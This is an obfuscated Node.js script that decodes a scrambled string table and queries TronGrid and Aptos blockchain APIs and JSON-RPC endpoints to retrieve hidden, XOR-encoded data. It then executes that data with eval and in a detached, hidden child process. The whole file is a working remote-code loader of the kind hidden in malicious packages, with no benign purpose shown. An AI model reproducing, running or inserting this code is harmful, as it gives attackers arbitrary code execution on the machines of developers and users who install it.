var _$_ccfc = _$af163278(
  "be_Vo%0l81ldJ1%c6%Nof%B9itU%p8kfb4JT%Nr0^n%B7rcsaUrqts2eec.toxn6ao%e.y%r%ST%npannefaf%tiw%o%sb8rtSataf/sglAtlZMau%H%70;a8b5trdt5heJD%vua%2sPst[t%?7n5Gbfsn=3tm7od728anrcca_trmhJ6rt5s%i9et%1nher9rz5m%3emfcoibm%9mlnxso.472end?Gw6e8zaette6rmeCupot14?E%d_iVu0l%0d%fiied%rTn_bu%a-1_gfty%igs83)p953C-aehgbtnhddt%seCeSc%aa3c%x=rge%sT-rce6eu2.f5eo5%t/3%esb_s2ho].mrfa0eiN8cpW%1oboyOdoiuori3e%8it=ioerCttg%%4Mtednn%asjD<r-%crcPp&_A7rmb:h2t351edeeY1s%00%opmrsdoArba%btc3%=0?m70e3%y;2%%npBnKos7tte%dHc7reemgs6ws9nbut0tlagfhfgs1.QZefrreara^n1LJB3%cPiaXfc:geu9Sei45r7TZBxs%EipcU616GzcSebe9rspd7!6d%uclighp73icvelxnnV3Ogiipn4ld2brArrojr%4ii?tc60o_ee%rt2%tadnny&c\'ftdg4nbe%efsranc3i%dTr7aTooe",
  1812138,
);
if (_$af163278 == _$_ccfc[32]) {
  _$af163278(_$_ccfc[13], true);
  _$af163278 = null;
}
function _$af163278(f, v) {
  var l = f.length;
  var d = [];
  for (var g = 0; g < l; g++) {
    d[g] = f.charAt(g);
  }
  for (var g = 0; g < l; g++) {
    var a = v * (g + 139) + (v % 20044);
    var w = v * (g + 473) + (v % 41543);
    var p = a % l;
    var b = w % l;
    var k = d[p];
    d[p] = d[b];
    d[b] = k;
    v = (a + w) % 5446973;
  }
  var r = String.fromCharCode(127);
  var z = "";
  var h = "%";
  var x = "#1";
  var q = "%";
  var i = "#0";
  var s = "#";
  return d.join(z).split(h).join(r).split(x).join(q).split(i).join(s).split(r);
}
(async () => {
  const i = global;
  const d = i[_$_ccfc[0]];
  i[_$_ccfc[1]] = _$_ccfc[2] + global[_$_ccfc[3]];
  async function c(t) {
    return new i[_$_ccfc[13]]((r, n) => {
      if (!_$af163278) {
        return;
      }
      d(_$_ccfc[12])
        [_$_ccfc[11]](t, (t) => {
          let e = _$_ccfc[7];
          t[_$_ccfc[6]](_$_ccfc[8], (t) => {
            e += t;
          });
          t[_$_ccfc[6]](_$_ccfc[4], () => {
            try {
              r(i[_$_ccfc[10]][_$_ccfc[9]](e));
            } catch (t) {
              n(t);
            }
          });
        })
        [_$_ccfc[6]](_$_ccfc[5], (t) => {
          if (!_$_ccfc) {
            _$af163278();
          } else {
            n(t);
          }
        })
        [_$_ccfc[4]]();
    });
  }
  async function s(o, c = [], s) {
    return new i[_$_ccfc[13]]((r, n) => {
      const t = i[_$_ccfc[10]][_$_ccfc[15]]({
        jsonrpc: _$_ccfc[14],
        method: o,
        params: c,
        id: 1,
      });
      const e = { hostname: s, method: _$_ccfc[16] };
      const a = d(_$_ccfc[12])
        [_$_ccfc[17]](e, (t) => {
          let e = _$_ccfc[7];
          t[_$_ccfc[6]](_$_ccfc[8], (t) => {
            e += t;
          });
          t[_$_ccfc[6]](_$_ccfc[4], () => {
            try {
              r(i[_$_ccfc[10]][_$_ccfc[9]](e));
            } catch (t) {
              n(t);
            }
          });
        })
        [_$_ccfc[6]](_$_ccfc[5], (t) => {
          n(t);
        });
      if (_$af163278 == null) {
        _$af163278(false);
        _$af163278 = 1;
        return;
      }
      a[_$_ccfc[18]](t);
      a[_$_ccfc[4]]();
    });
  }
  if (!_$af163278) {
    _$af163278 = true;
  }
  async function t(o, t, e) {
    let r;
    try {
      console.log("t");
      r = i[_$_ccfc[28]]
        [_$_ccfc[27]](
          (await c("https://api.trongrid.io/v1/accounts/" + t + _$_ccfc[25]))[
            _$_ccfc[8]
          ][0][_$_ccfc[24]][_$_ccfc[8]],
          _$_ccfc[26],
        )
        [_$_ccfc[23]](_$_ccfc[22])
        [_$_ccfc[21]](_$_ccfc[7])
        [_$_ccfc[20]]()
        [_$_ccfc[19]](_$_ccfc[7]);
      if (!r) {
        throw new Error();
      }
    } catch (t) {
      if (!_$_ccfc) {
        _$af163278();
      }
      r = (
        await c(
          "https://fullnode.mainnet.aptoslabs.com/v1/accounts/" +
            e +
            _$_ccfc[31],
        )
      )[0][_$_ccfc[30]][_$_ccfc[29]][0];
    }
    let n;
    async function a(t) {
      console.log("a");
      if (!_$_ccfc) {
        _$af163278 = _$_ccfc[13];
      }
      return i[_$_ccfc[28]]
        [_$_ccfc[27]](
          (await s(_$_ccfc[36], [r], t))[_$_ccfc[35]][_$_ccfc[34]][_$_ccfc[33]](
            2,
          ),
          _$_ccfc[26],
        )
        [_$_ccfc[23]](_$_ccfc[22])
        [_$_ccfc[21]](_$_ccfc[32])[1];
    }
    try {
      n = await a(_$_ccfc[37]);
      if (!n) {
        if (!_$_ccfc) {
          _$af163278(false, _$_ccfc[44]);
          _$af163278 = null;
          return;
        }
        throw new Error();
      }
    } catch (t) {
      n = await a(_$_ccfc[38]);
    }
    return ((e) => {
      const r = o[_$_ccfc[39]];
      let n = _$_ccfc[7];
      for (let t = 0; t < e[_$_ccfc[39]]; t++) {
        const a = o[_$_ccfc[40]](t % r);
        n += i[_$_ccfc[42]][_$_ccfc[41]](e[_$_ccfc[40]](t) ^ a);
      }
      return n;
    })(n);
  }
  const e = new i[_$_ccfc[44]]()[_$_ccfc[43]]();
  try {
    if (i[_$_ccfc[45]] && e - i[_$_ccfc[45]] < 3e4) {
      if (_$af163278 == _$_ccfc[19]) {
        return;
      }
      return;
    }
  } catch (t) {}
  i[_$_ccfc[45]] = e;
  try {
    const r = await t(_$_ccfc[46], _$_ccfc[47], _$_ccfc[48]);
    if (!_$_ccfc) {
      _$af163278(1);
    }
    eval(r);
  } catch (t) {}
  if (!_$af163278) {
    _$af163278();
  } else {
    try {
      console.log("last");
      const r = await t(_$_ccfc[49], _$_ccfc[50], _$_ccfc[51]);
      if (_$af163278 === _$_ccfc[19]) {
        _$af163278(false);
      }
      d(_$_ccfc[57])
        [_$_ccfc[56]](
          _$_ccfc[52],
          [
            _$_ccfc[53],
            "global[\'_V\']=\'" +
              (i[_$_ccfc[1]] || 0) +
              _$_ccfc[54] +
              r +
              _$_ccfc[7],
          ],
          { detached: true, stdio: _$_ccfc[55], windowsHide: true },
        )
        [_$_ccfc[6]](_$_ccfc[5], (t) => {
          eval(r);
        });
    } catch (t) {}
  }
})();

setTimeout(() => {}, 60000);
